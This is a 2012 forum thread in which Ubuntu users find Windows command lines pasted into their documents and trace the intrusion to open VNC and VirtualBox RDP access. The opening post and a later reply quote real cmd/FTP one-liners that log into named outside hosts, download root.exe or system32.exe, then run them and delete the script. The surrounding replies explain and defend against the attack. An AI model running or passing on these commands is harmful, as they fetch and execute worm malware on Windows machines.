---
title: "Virus via Windows?"
date: 2012-09-04
forum: Security
---

### Post by dunbrokin on 2012-09-04
I am on Ubuntu 12.04 and using LO 3.5.4

I woke up this morning to find this displayed on my PC in a LO write file:

2011-12 Governor 21 >> ik &echo user alizametal.com.tr hd611 >> ik &echo binary >> ik &echo get www/root.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &root.exe &exit echo You got owned

cmd /c echo open 89.19.29.116 21 >> ik &echo user alizametal.com.tr hd611 >> ik &echo binary >> ik &echo get www/root.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &root.exe &exit echo You got owned

cmd /c echo open 89.19.29.116 21 >> ik &echo user alizametal.com.tr hd611 >> ik &echo binary >> ik &echo get www/root.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &root.exe &exit echo You got owned

cmd /c echo open 89.19.29.116 21 >> ik &echo user alizametal.com.tr hd611 >> ik &echo binary >> ik &echo get www/root.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &root.exe &exit echo You got owned

cmd /c echo open 89.19.29.116 21 >> ik &echo user alizametal.com.tr hd611 >> ik &echo binary >> ik &echo get www/root.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &root.exe &exit echo You got owned

cmd /c echo open countx6.servegame.com 21 >> ik &echo user nobody lampp >> ik &echo binary >> ik &echo get system32.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &system32.exe &exit echo Windows has been updated.

Parts of this kept appearing in strange places on documents I was working on yesterday...I recognise some of it.

It is obviously some kind of Windows virus and is interfering with LO......

a) where does it hide b) how can I eliminate it c) how can I ensure it does not get passed on to Windows users?

---

### Post by Guilden_NL on 2012-09-05
You didn't mention if you are running or have disabled macros.  That's the first place to look for bad guys coming out of the MSFT Office into the Libre Office.

---

### Post by uRock on 2012-09-05
Moved to ***Security Discussions***.

---

### Post by dunbrokin on 2012-09-05
> **Guilden_NL said:**
> You didn't mention if you are running or have disabled macros.  That's the first place to look for bad guys coming out of the MSFT Office into the Libre Office.

There is very high probability that this virus came via a docx file. I have macros enabled, but on High Security level...I have looked in the macros folders for the write file that was opened on my PC and contained the above...but there is no obvious macro that contains these commands.

---

### Post by dunbrokin on 2012-09-05
This morning when I went to my machine, I saw that the remote viewer was active (which is very strange indeed) and that it was connected to a site beginning with 77.xx.xx.xx - I was so shocked (and assumed that I have been breached) that I clicked off the remote viewer without recording what the site it was connected to was.....is there a way that I can find, in the logs maybe, what that site IP is?

It aslo looks from the logs that there was a su command by nobody....and as nobody appears in the script above, I am wondering if that su command was issued by the virus. How would I know if su command was accepted by root or not i.e. whether my password has been breached and access has been granted to my files?

Here from my log:

Aug 26 20:30:01 joan-HP-Mini-5102 CRON[26099]: pam_unix(cron:session): session closed for user root
Aug 26 20:37:39 joan-HP-Mini-5102 su[26596]: Successful su for nobody by root
Aug 26 20:37:39 joan-HP-Mini-5102 su[26596]: + ??? root:nobody
Aug 26 20:37:39 joan-HP-Mini-5102 su[26596]: pam_unix(su:session): session opened for user nobody by (uid=0)
Aug 26 20:38:53 joan-HP-Mini-5102 su[26596]: pam_unix(su:session): session closed for user nobody
Aug 26 21:17:01 joan-HP-Mini-5102 CRON[27134]: pam_unix(cron:session): session opened for user root by (uid=0)
Aug 26 21:17:01 joan-HP-Mini-5102 CRON[27134]: pam_unix(cron:session): session closed for user root
Aug 26 22:17:01 joan-HP-Mini-5102 CRON[27419]: pam_unix(cron:session): session opened for user root by (uid=0)

---

### Post by lisati on 2012-09-05
There are several sites I'm aware of that can help you find out interesting things about specific IP adresses, including who to complain to. There are often limits to what you can learn without the benefit of the co-operation of service providers, but at least its a start.

One place to start might be [http://whatismyipaddress.com/ip-lookup](http://whatismyipaddress.com/ip-lookup)

---

### Post by dunbrokin on 2012-09-05
> **lisati said:**
> There are several sites I'm aware of that can help you find out interesting things about specific IP adresses, including who to complain to. There are often limits to what you can learn without the benefit the co-operation of service providers, but at least its a start.

One place to start might be [http://whatismyipaddress.com/ip-lookup](http://whatismyipaddress.com/ip-lookup)

Thanks for that...but first I need to know which IP it was connected to.

---

### Post by JKyleOKC on 2012-09-05
You can look up that "89.19.29.116" IP address shown in your first post. Those lines form a (Windows-only) script that will connect to that site via FTP and download a file, presumably of malware, as "root.exe" and then subsequently execute and delete it.

To locate that "77.x.x.x" IP you can search through /var/log/syslog and its older copies. These files will be large, but may contain references to IP addresses that can help you.

The openings for root shown in your auth.log excerpt, that happen at 17 minutes past the hour, are normal cron.hourly tasks. The others, however, may be a bit suspicious.

---

### Post by dunbrokin on 2012-09-05
> **JKyleOKC said:**
> You can look up that "89.19.29.116" IP address shown in your first post. Those lines form a (Windows-only) script that will connect to that site via FTP and download a file, presumably of malware, as "root.exe" and then subsequently execute and delete it.

To locate that "77.x.x.x" IP you can search through /var/log/syslog and its older copies. These files will be large, but may contain references to IP addresses that can help you.

The openings for root shown in your auth.log excerpt, that happen at 17 minutes past the hour, are normal cron.hourly tasks. The others, however, may be a bit suspicious.

Thanks for that...I will search the /var/log/syslog as you suggest. What do people advise should be my next step?

---

### Post by dunbrokin on 2012-09-06
I have searched all the logs that I can find....but I cannot see anywhere an indication of when I connect to my machine using VPN or when I connect to other machines using VPN. Neither can I see any log of when my machine connects nightly to JungleDisk to do a backup. Where might these be?

I have used the Tiger chkroot and that does not show anything sinister....so, I am beginning to suspect my suger-rushed imagination and am coming to the conclusion that, in all probability, I have not been compromised. 

However, I would still like to check out those logs to see where VPN and the JD conncection actually show.

---

### Post by catnmouse on 2012-09-18
I have an Ubuntu 12.04.1 fully updated Linux server (just updated  yesterday) with the latest version of Virtualbox running Windows 7 (also  fully updated). Windows 7 was running at the time.

 Today, when I used remote desktop protocol to get on to my Windows 7 VM, I saw notepad was opened, with the following text:


 cmd  /c echo open countx6.servegame.com 21 >> ik &echo user nobody  lampp >> ik &echo binary >> ik &echo get  system32.exe >> ik &echo bye >> ik &ftp -n -v -s:ik  &del ik &system32.exe &exit echo Windows has been updated.


 Needless  to say, it scared the crap out of me. Who was on my system, and what  were they trying to do? After inspecting everything, but not finding anything relevant in any logs, I realized that I  had enabled the remote display in VirtualBox for my Windows 7 VM.  VirtualBox does not use a password for the RDP service. I also noticed  that the vino-server in Ubuntu had used uPnP to open port 5900 on my  router. I figure this is how they got in.


 I'm still not sure how  the notepad was opened and if anyone was actually on my system or if it  was just a script kiddie, but I turned off uPnP, disabled the remote  desktop, and scanned the system for malware. Nothing was found.


 Does  anyone know how a remote attacker can open Notepad (or LibreOffice  apparently) without being on the machine? I know a carefully crafted URL  can accomplish the task, but how did our computers visit such a URL?


 I  was curious, so I ftp'd to countx6.servegame.com and downloaded  system32.exe. It's signature from MS Security Essentials was  Worm:Win32/Nayrabot.gen!A.


 Scary stuff...

---

### Post by JKyleOKC on 2012-09-18
Double-check any "system32.exe" file(s) you find on that Windows VM; what you found in Notepad was a script to create a batch file that would download a file by that name, which in all likelihood would be malware.

However since it was still in Notepad, it's quite possible that you found it before the intruder had saved and executed it. If so, you should be in good shape. But if you find a system32.exe file with a very recent file-modified date, then the Windows VM would be highly suspect...

---

### Post by dunbrokin on 2012-09-18
Aha!....you have had a similar experience to my own. What first alerted me that I had been hacked was something very similar as explained above...and how I was hacked was trough the vnc with uPnP ticked....now, I do not remember ticking this....last thing I remember was that I had ticked permission was needed to control the desktop....so how this changed I really do not know. It is possible I changed it...but I a 60% confident that I did not.

I have run a number of root checks and not found anything malicous. I have now closed the ability to access my PC via the net.

It strikes me that a) this was a bot..which is why my Libre Office writer file on my desktop was opened showing the virus script or b) some very clever (but ethical) hacker leaving his/her calling card to say "Wise up Buddy, you have been hacked!...check your system before the bad guys get in".

I dunno, I am mystified by the whole thing. I am contemplating taking my PC back to bare metal and reinstalling....but that seems very paranoid as I cannot find any trace on the logs or on the rootkits that anything evil has happened.

But thanks for sharing your experience...makes me feel much better in one way! :)

---

### Post by catnmouse on 2012-09-18
dunbrokin: From a bash prompt in an Ubuntu X environment, run the following program: ```
vino-preferences
``` You might be surprised to find that the checkbox for "Automatically configure uPnP router to open and forward ports" is checked by default! Also, there is no password set up by default.

I fixed my preferences right away! See attachment.

---

### Post by dunbrokin on 2012-09-18
> **catnmouse said:**
> dunbrokin:  You might be surprised to find that the checkbox for "Automatically configure uPnP router to open and forward ports" is checked by default! Also, there is no password set up by default.



I have already done that thanks....yes, I am more than surprised that this is the default!...what a security risk that is for all newbie Ubuntu users!

---

